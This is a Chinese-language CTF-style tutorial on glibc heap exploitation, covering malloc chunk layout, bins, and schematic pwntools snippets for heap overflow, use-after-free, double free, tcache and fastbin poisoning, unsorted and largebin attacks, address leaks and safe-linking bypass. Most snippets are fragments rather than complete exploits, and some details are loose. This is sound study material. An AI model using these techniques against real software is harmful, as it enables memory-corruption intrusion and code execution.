# 堆利用基础 (Heap Basics)

## 原理

glibc 的堆管理器（ptmalloc）通过 bins（fastbin/smallbin/largebin/unsorted bin/tcache）管理空闲堆块。攻击者通过堆溢出、UAF、Double Free 等漏洞破坏堆块元数据，实现任意地址写、信息泄露、代码执行。

## 堆块结构

```c
// glibc malloc_chunk 结构
struct malloc_chunk {
    INTERNAL_SIZE_T      mchunk_prev_size;  // 前一个 chunk 大小（如果前一个 free）
    INTERNAL_SIZE_T      mchunk_size;        // 当前 chunk 大小 + flags
    struct malloc_chunk* fd;                 // 前向指针（free 时）
    struct malloc_chunk* bk;                 // 后向指针（free 时）
    struct malloc_chunk* fd_nextsize;        // largebin 用
    struct malloc_chunk* bk_nextsize;        // largebin 用
};

// flags
#define PREV_INUSE 0x1   // 前一个 chunk 在使用中
#define IS_MMAPPED 0x2   // mmap 分配
#define NON_MAIN_ARENA 0x4  // 非 main_arena
```

## Bins 分类

| Bin 类型 | 大小范围 | 数量 | 特点 |
|---------|---------|------|------|
| Fastbin | 0x20-0x80 (64位) | 10 | LIFO，单链表，不合并 |
| Smallbin | 0x20-0x3F0 | 62 | FIFO，双链表 |
| Largebin | 0x400+ | 63 | 按大小排序，双链表 |
| Unsorted Bin | 任意 | 1 | 临时存放，FIFO |
| Tcache | 0x20-0x410 (glibc 2.26+) | 64 | LIFO，单链表，无合并 |

## 攻击链

### 1. 堆布局

```python
from pwn import *

p = process('./pwn')

# 分配堆块
p.sendlineafter(b'>', b'1')  # malloc
p.sendlineafter(b'size:', b'0x20')

# 释放堆块
p.sendlineafter(b'>', b'2')  # free
p.sendlineafter(b'idx:', b'0')
```

### 2. 堆溢出

```python
# 堆块 A | 堆块 B
# 向 A 写入超过其大小的数据，覆盖 B 的元数据

# 分配两个相邻堆块
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1

# 溢出 idx 0，覆盖 idx 1 的 size
payload = b'A' * 0x20  # 填满 idx 0
payload += p64(0)       # prev_size
payload += p64(0x41)    # size（0x31 -> 0x41，扩大）
# 这样 free(idx 1) 时会释放更大的区域
```

### 3. Off-by-One

```python
# 只覆盖一个字节
# 通常覆盖 size 的最低字节

# 堆块 A (0x20) | 堆块 B (0x30)
# 向 A 写入 0x20 字节 + 1 字节
# 覆盖 B 的 size 最低字节

payload = b'A' * 0x20
payload += b'\x41'  # 覆盖 size 最低字节
```

### 4. UAF (Use After Free)

```python
# 释放后仍持有指针
malloc(0x20)  # idx 0
free(0)       # 释放
# 但仍能通过 idx 0 访问

# 利用：覆盖 fd 指针
malloc(0x20)  # idx 0
free(0)
# 此时 fd 指向 NULL（tcache 第一个）
# 通过 UAF 写入 fd
edit(0, p64(target_addr))
# 下次 malloc 返回 target_addr
malloc(0x20)  # idx 1，返回 tcache 中的块
malloc(0x20)  # idx 2，返回 target_addr
```

### 5. Double Free

```python
# 同一个 chunk 被 free 两次
# tcache double free (glibc < 2.29)
malloc(0x20)  # idx 0
free(0)
free(0)       # double free
# tcache: chunk -> chunk -> chunk -> ...
malloc(0x20)  # 返回 chunk
edit(0, p64(target_addr))  # 修改 fd
malloc(0x20)  # 返回 chunk
malloc(0x20)  # 返回 target_addr
```

### 6. Tcache Poisoning

```python
# glibc 2.26+
# 修改 tcache 的 fd 指针

malloc(0x20)  # idx 0
free(0)
# UAF 修改 fd
edit(0, p64(target_addr))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 target_addr
```

### 7. Fastbin Attack

```python
# glibc < 2.26 或 tcache 满了之后
# 修改 fastbin 的 fd 指针

# 1. 分配 7 个 0x70 的 chunk
for i in range(7):
    malloc(0x70)
malloc(0x70)  # idx 7
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 fastbin
free(7)
# 4. UAF 修改 fd
edit(7, p64(target_addr))
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 6. 分配得到 target_addr
malloc(0x70)  # 返回 fastbin 中的块
malloc(0x70)  # 返回 target_addr
```

### 8. Unsorted Bin Attack

```python
# 修改 unsorted bin 的 bk 指针
# 实现 main_arena 地址写入

# 1. 分配大 chunk
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 修改 bk
edit(0, p64(0) + p64(target_addr - 0x10))
# 4. 分配触发
malloc(0x400)
# target_addr 处被写入 main_arena 地址
```

### 9. Largebin Attack

```python
# 修改 largebin 的 bk_nextsize
# 实现任意地址写堆地址

# 1. 分配大 chunk
malloc(0x420)  # idx 0
malloc(0x20)   # idx 1
malloc(0x410)  # idx 2
malloc(0x20)   # idx 3
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. 分配大 chunk，触发 idx 0 进入 largebin
malloc(0x430)  # idx 4
# 4. 释放 idx 2
free(2)
# 5. 修改 idx 0 的 bk_nextsize
edit(0, ...)  # 修改 bk_nextsize = target_addr - 0x20
# 6. 分配触发
malloc(0x430)
# target_addr 处被写入堆地址
```

## 信息泄露

### 1. 泄露 libc 地址

```python
# 1. 分配大 chunk（大于 tcache 范围）
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 读取 fd/bk
fd = u64(read(0, 8))
libc_base = fd - (libc.symbols['main_arena'] + 96)
```

### 2. 泄露堆地址

```python
# 1. 分配两个 chunk
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1
# 2. 释放 idx 0
free(0)
# 3. UAF 读取 fd
fd = u64(read(0, 8))
heap_base = fd & ~0xfff
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks

```python
# 传统 __malloc_hook/__free_hook 失效
# 新利用方法：
# 1. IO_FILE 攻击（House of Apple 系列）
# 2. exit_funcs 利用
# 3. _environ 泄露栈地址
# 4. TLS 劫持
# 5. __stack_chk_guard 覆盖
```

### 2. safe-linking

```python
# glibc 2.32+
# tcache/fastbin 指针加密
# ptr = (ptr >> 12) ^ target
# 需要知道堆地址才能伪造指针

# 泄露堆地址后
heap_addr = ...
target = ...
encrypted = (heap_addr >> 12) ^ target
edit(idx, p64(encrypted))
```

### 3. tcache key 加固

```python
# glibc 2.29+ tcache key
# glibc 2.34+ 加强 key 检测
# double free 检测更严格
# 需要绕过 key
# 方法：覆盖 key 字段
edit(idx, p64(target) + p64(0))  # 覆盖 fd 和 key
```

### 4. House of Apple 系列

```python
# House of Apple 2/3
# 针对 glibc 2.34+
# 通过 IO_FILE 实现 RCE
# 利用 _IO_wfile_overflow 等
```

### 5. House of Cat

```python
# 2024 年新利用链
# 针对 glibc 2.35+
# 通过 IO_FILE 实现 RCE
```

### 6. per-thread cache

```python
# 多线程环境
# 每个线程有自己的 tcache
# 需要考虑线程安全
```

### 7. 现代编译器优化

```python
# GCC 13+ 对堆操作的影响
# 可能影响堆布局
```

### 8. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# MTE (Memory Tagging Extension)
# 影响堆利用
```

### 9. 沙箱环境

```python
# seccomp 限制
# 通过 ORW (open/read/write) 绕过
# 通过侧信道绕过
```

### 10. 新型利用链

```python
# House of Banana
# House of Banana 2
# House of Cat
# House of Emu
# 新的 IO_FILE 利用
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（heap/bins 命令）
- **gdb + gef** — 动态调试
- **heap-viewer** — 堆可视化
- **LibcSearcher** — libc 版本识别

## 参考链接

- [ctf-wiki heap](https://ctf-wiki.org/pwn/linux/glibc-heap/)
- [glibc malloc](https://sourceware.org/glibc/wiki/MallocInternals)
- [Shellphish Heap Exploitation](https://github.com/shellphish/how2heap)
- [Heap Exploitation Part 1](https://blog.infosectc.com.br/heap-exploitation-part-1-understanding-the-glibc-heap-implementation)
